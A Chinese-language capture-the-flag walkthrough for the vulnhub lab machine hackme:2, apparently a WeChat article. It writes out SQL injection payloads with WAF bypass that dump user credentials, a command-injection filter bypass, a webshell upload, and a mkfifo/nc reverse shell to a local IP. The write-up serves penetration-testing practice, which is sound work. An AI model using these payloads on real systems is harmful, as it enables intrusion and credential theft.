> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/u77XaCgnzw_dvl9hOaUxKw)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsXcpia1W6ZNd513icXLgjnncgUzYLP2yzbiaPjnmSYs6ILPZdusibgPJNVw/640?wx_fmt=png)

**0x01 背景：**  

---------------

hackme:2 是 vulnhub 上的一个 medium 难度的 CTF 靶机，难度适中、内容丰富，贴近实战。而且没有太多的脑洞，适合安全工作者们用来练习渗透测试，然而唯一的缺憾是目前没有公开的攻略，因此把个人的通关过程记录于此，作为攻略分享给大家！

**0x02 技术关键词：**
---------------

SQL 注入、WAF Bypass、模糊测试、文件上传、suid 提权

**0x03 靶机发现与端口扫描**
------------------

做 vulnhub 上的靶机的第一步，所有的靶机都是一样的套路，不在这里多费笔墨。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsBYF5Agmm06WgHzXjZFibicz0GDg1OxiaChxAUFTIvzgnzYGs1Nqvxlk6A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPws1JTxicIFQjT6vCBzZcfNsuQam6z4LUVI5yEgwHzveicK3HticgOjEpaTQ/640?wx_fmt=png)

**0x04 SQL 注入与 WAF Bypass**
---------------------------

打开位于 80 端口的 Web 页面，注册一个测试账号 wangtua/wangtua，就可以登录系统了，可以发现是一个书店系统。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsMhwPFdhKktEnUyMFwf1T8pZGe6ylEdtHLmibVjBVJupiayVYD4geaOAA/640?wx_fmt=png)

进入系统之后发现有一个搜索框，SQL 注入的套路很明显了。要做 SQL 注入、第一步就是猜测 SQL 语句的格式和注入点。

### **1、探测 SQL 格式，WAF 规则**

本搜索框的功能是检索数据库中的书名、当搜索框为空的时候，可以返回所有的内容，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsGMMJ7BtszkT56DW43IxeL8W9oqBn9bz4xBRA4NyRa2q3ib4k0jiaEb0g/640?wx_fmt=png)

当搜索框中只包含书名的前一部分的时候，也可以返回对应的内容：

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsPXMQYtTbJmP6W6IXE8OdkmP08srZ2qsn3Anu8WF7v3UM3HVPUcyhxw/640?wx_fmt=png)

因此我们猜测 SQL 语句格式为 (% 代表通配符，可以匹配零个或者多个任意字符)：  

```
$sql = "SELECT * FROM BOOKS WHERE book_name LIKE '".$input."%';"
```

基于此，我们构造如下 payload：

```
Linux%' and '123' like '1
```

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsYNpVop8oiaWb3icA0hicicBI7HcysuI4YMD4MqZH6zEDJ8f4JAiaIPKRfcw/640?wx_fmt=png)

使用另一个 payload：

```
Linux%' and '23' like '1
```

发现无法返回结果  

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsQ8NZqVyeQmzldEC40DQ7ySibwjmCt2AdplbCdN5ct8ChEKatAlianUzA/640?wx_fmt=png)

可以验证我们的想法。  
然而我们使用数据库函数的时候却出现了问题：  
Payload:

```
Linux%'/**/and database() like/**/'
```

没有返回内容, 而当我们使用注释符来代替空格的时候，则可以执行成功。  

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsQo29b4frUeypZhnQNJTlPQa32YL4CM42WtD6icJoV5nl1mn2PlNXiatQ/640?wx_fmt=png)

### 2、构造 Payload

通过构造联合查询，一步一步获取出数据库名，表名，列名和字段  

```
Linux%'/**/union/**/select/**/database/**/(),'2','3
```

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsybBZxE5qzOhBxRSic1WIIh9NVibcrrJFqwAuJswyrlWsiaIIlGClX8Lng/640?wx_fmt=png)

```
Linux%'/**/union/**/select/**/group_concat(table_name),"2","3"/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'webapp
```

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwswEd5xLuQ63sbeB3Zia0kY1mJLP5ZepUwTL4DcxUib4Tibuib7hc9UZXOeQ/640?wx_fmt=png)

```
Linux%'/**/union/**/select/**/group_concat(column_name),"2","3"/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/'users'and/**/table_schema/**/like'webapp
```

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsfFp8JkfteQ4lKzhqiamAQZzHbZvj1S0BHibtwgeeLFNaiaQysaRKwpIDA/640?wx_fmt=png)

```
Linux%'/**/union/**/select/**/group_concat(user),'2',group_concat(pasword)/**/from/**/users/**/where/**/'1'/**/like/**/'
```

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsvJmSqyg8CbSHBrrp9tEv2FuMpdZuicETTJAnANVa0bCyzniavgBTHHxA/640?wx_fmt=png)

到此为止我们发现了一个 superadmin 的账号，将 md5 值在线解码之后发现是 Uncrackable

**0x05 模糊测试与命令执行**
------------------

进入超级管理员账号之后，我们发现了一个可以进行文件上传的点,

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsOuxlibUtxoYk2aibAKuLy9NicqCJHibNHSYfl7B8e4WEiapT56oq3hvfPSw/640?wx_fmt=png)

上传 cat.jpg 之后，页面上回显了上传路径。  
然而我们却无法直接访问任何文件。  
接下来我们注意到下面两个输入框，可以将处理结果回显到页面上，这里我除了想到 XSS 之外。还想到了测试命令注入或者模板注入。可以发现在 Last Name 输入框里输入 7*7，可以返回 49  
我们可以使用 BurpSuite 专业版的 Intruder 模块来进行模糊测试。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPws1b60tG42L3Kb3c4e7vUtrBgsTIZq8T8CicRDwTibGvtDgqSMNXFicN56w/640?wx_fmt=png)

Payload 选择模糊测试 - 完整，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsr3Vc8x1CfDrdNB1ePPHohAb2rav15UeLGpcUsdDCtCn0AJ0zxx2Yvw/640?wx_fmt=png)

点击开始攻击。  
攻击完成之后可以发现 `id` 这个 payload 有命令执行的回显。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsj4uc9PbabJFmbm5MrkG92MStfvqveUwXIX0ibsr9MDxiaIttxqNicH5sg/640?wx_fmt=png)

我们换其他命令来执行，例如 pwd,ls 都可以正确执行而 cat 命令无法执行，猜测其过滤了空格，我们使用 cat<welcomeadmin.php 这个 payload 来绕过过滤。  
可以看到在返回包里泄露的 welcomeadmin.php 的完整源代码，包括文件上传的绝对路径。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPws1h4I0ny7A3jjwxffvKtia2eLYPJhcyndX7ZkZlKgxVOuTtj1NJadBTw/640?wx_fmt=png)

以及命令执行的成因：

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPws0HwhjbUkPQ8ylia9AWTfHZWccfjzMicGibHXVU4rWrtS0JNo9g54TsIyg/640?wx_fmt=png)

使用哥斯拉生成木马并上传，发现 php 后缀被过滤，换成 php3 等也不行。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsnrz3hWQPibVaEYfH2zvyOSjKzCnUdTPfgIibxtgrUfbrnbQ0yUApLPzw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsMeydhR0vOuDiaIdz1bstXibg6qVxcX8nO6LhMvHpdIdoCqqtpxwRNIRA/640?wx_fmt=png)

后缀改成 png 之后才上传成功，然而无法正常解析成 PHP 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPws09RfVqbdOaib5iciaZVlNdQXYEgf5vshKwlmxBsLl7TAPLDcP29PT7qwA/640?wx_fmt=png)

这里考虑使用刚才的命令执行漏洞，将文件名改成 god.php

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPws4ibR7zKtGjXVN0ibSQQJIeNurIrxpAnRrKtuEW8JfkphrsmpF294Nkpw/640?wx_fmt=png)

使用哥斯拉进行连接，发现连接成功

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPws15kaF2JlWib5lT2Z8IpKQhicP25icreOoV5fJibQWSyuPCDxfJcJwLia88Q/640?wx_fmt=png)

**0x06 后渗透与提权**
---------------

为了可以有更好的交互环境，我们用 kali 自带的 weevely 生成木马并连接，完成连接之后使用 nc 反弹 shell：  
由于靶机的 nc 版本特殊，无法使用 nc -e 选项，因此这里使用了如下的 payload  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.48.129 2333 >/tmp/f  
(来自参考资料 2)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsJubfL937A9gAaI8ly0X3icVibjj1yIACO1nn7LHhB6LafFLjj031OyDA/640?wx_fmt=png)

使用 pyhton 伪终端命令, 可以在伪终端执行 sudo 等命令

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsDbFP2MJgjWXqaicy6kdfic6iaJFOVT4MuFcJic0SdWget9LvU8yLTCDcmQ/640?wx_fmt=png)

使用命令 find / -perm -u=s -type f 2>/dev/null 来发现设置了 suid 位的应用程序（参考资料 1）  
关于 suid 提权的原理，可以参考 P 师傅的博客 (参考资料 3)。

发现 home 目录下有一个可疑的文件，执行一下之后发现顺利 get root 权限。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsaaIzJ4y5dZrMdianA0KrL1B0JJHibR1KSUiaQ2VFIK5MoqhVUqR4opItg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5vibAFHYslaOzu3N9IricPwsHdbo0dZvzAtvYHStW4qudC255htpCk2Jz6ibm9WsTBqJFFHlmrgY10w/640?wx_fmt=png)  

**0x07 总结与复盘：**
---------------

这台靶机感觉制作的比较用心，SQL 注入和文件上传等部分都比较贴近实战，唯一美中不足的是提权部分有些太过简单。目前本人正在备考 OSCP，在 vulnhub 和 HTB 上做了不少靶机，打算最近把 vulnhub 上后渗透的套路总结一下，再发一篇文章，希望大家支持一下。

**0x08 参考资料：**
--------------

1） https://payatu.com/guide-linux-privilege-escalation  
2） https://github.com/swisskyrepo/PayloadsAllTheThings  
3） https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html

（点击 “阅读原文” 查看链接）

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)
----------------------------------------------------------------------------------------------------------------------------------------------

  

- End -  

精彩推荐

[免拆芯片提取固件](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649738145&idx=3&sn=4dc13022cd2dde0e4e270e02f1955757&chksm=888cfbcebffb72d85a53f3ba66f030c60605445485f19e0686138211a6079a7365bbc3873529&scene=21#wechat_redirect)  

[风吹幡动：F5 与 “感知可控、随需而变的应用”](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649737654&idx=3&sn=4c96bfa681a4a0188cf6fbd19b2e1420&chksm=888cf9d9bffb70cf98171e6190ea43894e3376a6257329a6b2b1bad0a9f7c7b50e8f382df2e7&scene=21#wechat_redirect)  

[gatesXgame](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649737587&idx=3&sn=8f21d3884d1c9e5e518562c33e4c2d4a&chksm=888cf91cbffb700a5b0f68e51e1324d5527cb76a5b8b4169b50c0baa042b2edf230f7c50740b&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif)  

------------------------------------------------------------------------------------------------------------------------------------------------

**戳 “阅读原文” 查看更多内容**